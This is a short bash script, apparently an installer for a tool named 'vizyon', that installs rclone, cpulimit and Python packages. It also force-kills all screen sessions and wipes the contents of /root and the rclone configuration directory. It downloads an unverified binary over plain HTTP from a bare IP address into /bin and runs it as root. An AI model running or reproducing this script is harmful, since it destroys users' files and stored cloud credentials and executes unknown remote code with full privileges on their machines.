#!/usr/bin/bash
apt-get update
apt install dialog -y
apt install python3 pip -y
apt install rclone -y
apt-get install -y cpulimit
killall -9 screen
cd /bin && wget -O vizyon http://78.135.83.71/ahmet/vizyon && chmod +x vizyon
cd /root && rm -rf *
cd /root/.config && rm -rf rclone
clear
echo "Teşekkürler vizyon komutu ile kullanabilirsiniz."
vizyon
yes "" | command
